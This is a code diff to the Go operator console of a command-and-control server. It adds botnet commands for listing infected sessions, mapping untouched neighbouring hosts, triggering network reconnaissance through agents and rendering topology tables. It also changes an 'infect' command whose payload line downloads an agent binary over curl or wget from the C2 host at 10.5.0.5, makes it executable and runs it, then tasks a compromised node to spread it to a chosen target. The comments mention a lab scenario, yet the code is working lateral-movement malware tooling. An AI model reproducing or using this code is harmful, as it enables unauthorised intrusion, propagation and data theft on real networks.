@@ -43,7 +43,7 @@ var (
 	// Command History & Autocomplete
 	cmdHistory    []string
 	historyIdx    = -1
-	knownCommands = []string{"exec", "tasks", "loot", "clear", "exit", "broadcast", "infect", "help", "usage"}
+	knownCommands = []string{"exec", "tasks", "loot", "clear", "exit", "broadcast", "infect", "sessions", "targets","discovery", "show-recon", "help", "usage"}
 
 	// UI Components
 	app          *tview.Application
@@ -72,6 +72,7 @@ type Telemetry struct {
 	EnvContext      string  `json:"e"`
 	ArtifactPreview string  `json:"p"`
 	DefenseProfile  string  `json:"d"`
+	ScanResults string `json:"v"`
 	LastSeen        time.Time
 }
 
@@ -169,8 +170,15 @@ func LogHeartbeat(transport string, t Telemetry) {
 		ts := arrival.Format("15:04:05")
 
 		if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
-			fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ EXEC_SUCCESS ][-:-] [blue]%s[white] > %s\n",
-				ts, t.AgentID, t.ArtifactPreview[4:])
+			output := t.ArtifactPreview[4:]
+			// Split by newline and print each line to prevent TUI truncation
+			lines := strings.Split(output, "\n")
+			fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ EXEC_SUCCESS ][-:-] [blue]%s[white] >\n", ts, t.AgentID)
+			for _, line := range lines {
+				if strings.TrimSpace(line) != "" {
+					fmt.Fprintf(agentLog, "  [white]%s\n", line)
+				}
+			}
 		} else if isNewLoot {
 			fmt.Fprintf(agentLog, "[%s] [black:yellow][ INTEL_CONFIRMED ][-:-] [blue]%s[white] exfiltrated unique telemetry\n",
 				ts, t.AgentID)
@@ -336,13 +344,70 @@ func printHelp() {
 [white]exec         | Task a specific node with a shell command | exec <ID> <CMD>
 tasks        | View all currently queued/pending tasks   | tasks
 broadcast    | Task ALL active nodes simultaneously      | broadcast <CMD>
+discovery    | Map Layer-2 (ARP) and Layer-3 (Routing)   | discovery
+show-recon   | Render the aggregated network topology    | show-recon
 infect       | Pivot: Task node to infect another target | infect <SourceID> <TargetIP>
 loot         | Access the vault of exfiltrated data      | loot
+sessions     | List all the infected assets              | sessions
+targets      | List neighbors not infected - TARGETS     | targets
 clear        | Flush the transmission log display        | clear
 help/usage   | Display this tactical manual              | help
 exit         | Initiate Scorched Earth shutdown          | exit
 `
 	fmt.Fprintf(agentLog, "[%s] %s\n", ts, helpText)
+}
+
+// RenderDiscoveryTables displays the aggregated network topology harvested from agents
+func RenderDiscoveryTables() {
+	ts := time.Now().Format("15:04:05")
+	fmt.Fprintf(agentLog, "[%s] [blue:black:b] ENHANCED NETWORK TOPOLOGY MAP [-:-:-]\n", ts)
+
+	// --- TARGET_HOSTS TABLE ---
+	fmt.Fprintf(agentLog, "\n[yellow]┌────────────────── TARGET_HOSTS ──────────────────┐[-]\n")
+	fmt.Fprintf(agentLog, "[yellow]│ IP_ADDRESS    | MAC_ADDR          | SOURCE_NODE  │[-]\n")
+	fmt.Fprintf(agentLog, "[yellow]├──────────────────────────────────────────────────┤[-]\n")
+	
+	agentMutex.Lock()
+	hasHosts := false
+	for _, t := range activeAgents {
+		// Scans the neighbor data reported in ScanResults (v)
+		if t.ScanResults != "" && !strings.Contains(t.ScanResults, "default") {
+		    lines := strings.Split(t.ScanResults, "\n")
+		    for _, line := range lines {
+		        if strings.Contains(line, "lladdr") {
+		            fmt.Fprintf(agentLog, "  %s\n", line)
+		            hasHosts = true
+		        }
+		    }
+		}
+	}
+	if !hasHosts {
+		fmt.Fprintf(agentLog, "  [white] (Pending ARP exfiltration from agents...) \n")
+	}
+	fmt.Fprintf(agentLog, "[yellow]└──────────────────────────────────────────────────┘[-]\n")
+
+	// --- TARGET_NETWORKS TABLE ---
+	fmt.Fprintf(agentLog, "\n[blue]┌──────────────── TARGET_NETWORKS ─────────────────┐[-]\n")
+	fmt.Fprintf(agentLog, "[blue]│ SUBNET/CIDR   | GATEWAY           | INTERFACE    │[-]\n")
+	fmt.Fprintf(agentLog, "[blue]├──────────────────────────────────────────────────┤[-]\n")
+	
+	hasNets := false
+	for _, t := range activeAgents {
+		if strings.Contains(t.ScanResults, "default") || strings.Contains(t.ScanResults, "10.5.0") {
+			lines := strings.Split(t.ScanResults, "\n")
+			for _, line := range lines {
+				if strings.Contains(line, "dev eth") {
+					fmt.Fprintf(agentLog, "  [white]%-15s | %-12s | %s\n", t.AgentID, "Route:", line)
+					hasNets = true
+				}
+			}
+		}
+	}
+	if !hasNets {
+		fmt.Fprintf(agentLog, "  [white] (Pending routing table telemetry...) \n")
+	}
+	fmt.Fprintf(agentLog, "[blue]└──────────────────────────────────────────────────┘[-]\n")
+	agentMutex.Unlock()
 }
 
 func handleCommand(cmd string) {
@@ -373,6 +438,78 @@ func handleCommand(cmd string) {
 			fmt.Fprintf(agentLog, "  - %s -> %s\n", id, c)
 		}
 		taskMutex.Unlock()
+	case "sessions":
+		agentMutex.Lock()
+		ts := time.Now().Format("15:04:05")
+		fmt.Fprintf(agentLog, "[%s] [blue]ACTIVE_SESSION_TABLE:[-:-]\n", ts)
+		fmt.Fprintf(agentLog, "  %-15s | %-15s | %-12s | %s\n", "NODE_ID", "INTERNAL_IP", "USER", "OS")
+		fmt.Fprintf(agentLog, "  ------------------------------------------------------------\n")
+		for id, t := range activeAgents {
+			fmt.Fprintf(agentLog, "  %-15s | %-15s | %-12s | %s\n", id, t.Hostname, t.Username, t.OS)
+		}
+		agentMutex.Unlock()
+
+	case "targets":
+		ts := time.Now().Format("15:04:05")
+		c2IP := "10.5.0.5" 
+		fmt.Fprintf(agentLog, "[%s] [blue]NETWORK_SCAN_REPORT:[-:-]\n", ts)
+		fmt.Fprintf(agentLog, "  %-15s | %-12s | %s\n", "POTENTIAL_IP", "SOURCE_NODE", "STATUS")
+		fmt.Fprintf(agentLog, "  ------------------------------------------------------------\n")
+		
+		seenTargets := make(map[string]bool)
+		agentMutex.Lock()
+		for _, t := range activeAgents {
+			// CHECK BOTH: ArtifactPreview (p) AND ScanResults (v) fields
+			rawData := ""
+			if strings.HasPrefix(t.ArtifactPreview, "SCAN:") {
+				rawData = strings.TrimPrefix(t.ArtifactPreview, "SCAN:")
+			} else if t.ScanResults != "" {
+				rawData = t.ScanResults
+			}
+
+			if rawData != "" {
+				ips := strings.Split(rawData, ",")
+				for _, ip := range ips {
+					ip = strings.TrimSpace(ip)
+					// Filter out C2, Loopback, and duplicates
+					if ip == "" || seenTargets[ip] || ip == "127.0.0.1" || ip == c2IP {
+						continue
+					}
+
+					isInfected := false
+					for _, active := range activeAgents {
+						if active.Hostname == ip {
+							isInfected = true
+							break
+						}
+					}
+
+					if !isInfected {
+						fmt.Fprintf(agentLog, "  %-15s | %-12s | [red]NOT_INFECTED[-:-]\n", ip, t.AgentID)
+						seenTargets[ip] = true
+					}
+				}
+			}
+		}
+		agentMutex.Unlock()
+	case "discovery":
+		ts := time.Now().Format("15:04:05")
+		fmt.Fprintf(agentLog, "[%s] [blue]TRIGGERING AUTONOMOUS AGENT DISCOVERY...[-:-]\n", ts)
+		
+		agentMutex.Lock()
+		taskMutex.Lock()
+		count := 0
+		for id := range activeAgents {
+			// Now we only send the keyword; the Agent's internal logic handles the ping and scraping
+			agentTasks[id] = "discovery"
+			count++
+		}
+		taskMutex.Unlock()
+		agentMutex.Unlock()
+		fmt.Fprintf(agentLog, "[%s] [yellow]SIGNAL_SENT >[white] %d agents initiating internal recon\n", ts, count)
+
+	case "show-recon":
+		RenderDiscoveryTables()
 	case "loot":
 		lootMutex.Lock()
 		if len(vault) == 0 {
@@ -402,21 +539,22 @@ func handleCommand(cmd string) {
 		agentMutex.Unlock()
 		fmt.Fprintf(agentLog, "[%s] [yellow]BROADCAST_SENT >[white] Tasked %d nodes with: %s\n", ts, count, command)
 	case "infect":
-		if len(fields) < 3 {
-			fmt.Fprintf(agentLog, "[%s] [red]ERROR:[white] Usage: infect <SourceID> <TargetIP>\n", ts)
-			return
-		}
-		sourceID := fields[1]
-		targetIP := fields[2]
-		
-		// LoTL Implementation: Tries curl first, fallbacks to wget
-		payloadCmd := fmt.Sprintf("(curl -sL http://10.5.0.5:8080/dist/hydra-agent -o /tmp/h-agent || wget -q http://10.5.0.5:8080/dist/hydra-agent -O /tmp/h-agent) && chmod +x /tmp/h-agent && /tmp/h-agent &")
-		
-		taskMutex.Lock()
-		agentTasks[sourceID] = fmt.Sprintf("PROPAGATE %s %s", targetIP, payloadCmd)
-		taskMutex.Unlock()
-		
-		fmt.Fprintf(agentLog, "[%s] [yellow]INFECTION_INITIATED[white] > Node %s tasked to infect %s\n", ts, sourceID, targetIP)
+			if len(fields) < 3 {
+				fmt.Fprintf(agentLog, "[%s] [red]ERROR:[white] Usage: infect <SourceID> <TargetIP>\n", ts)
+				return
+			}
+			sourceID := fields[1]
+			targetIP := fields[2]
+			
+			// LotL Implementation updated for the Gamma (10.5.0.12) scenario
+			// We use the C2 (10.5.0.5) as the delivery server defined in your gin router
+			payloadCmd := fmt.Sprintf("(wget -q http://10.5.0.5:8080/dist/hydra-agent -O /tmp/h-agent || curl -sL http://10.5.0.5:8080/dist/hydra-agent -o /tmp/h-agent) && chmod +x /tmp/h-agent && /tmp/h-agent &")
+			
+			taskMutex.Lock()
+			agentTasks[sourceID] = fmt.Sprintf("PROPAGATE %s %s", targetIP, payloadCmd)
+			taskMutex.Unlock()
+			
+			fmt.Fprintf(agentLog, "[%s] [yellow]INFECTION_INITIATED[white] > Node %s tasked to pivot to %s\n", ts, sourceID, targetIP)
 	case "clear":
 		agentLog.Clear()
 	case "exit":
